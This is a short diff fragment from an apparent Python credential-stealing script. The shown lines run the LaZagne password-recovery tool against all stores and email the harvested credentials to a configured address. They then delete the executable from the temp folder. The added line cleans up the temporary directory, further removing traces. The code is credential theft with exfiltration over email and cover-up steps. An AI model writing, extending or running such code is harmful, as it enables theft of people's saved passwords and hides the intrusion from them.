@@ -27,3 +27,4 @@ result=subprocess.check_output("laZagne.exe all",shell=True)
 send_mail("email","password",result)#put your email and password in double-quotes
 #and also enable the "Less secure app settings of your email or else the message will not be emailed to you"
 os.remove("laZagne.exe") #this will del the .exe file from the temp folder
+temp_dir.cleanup()
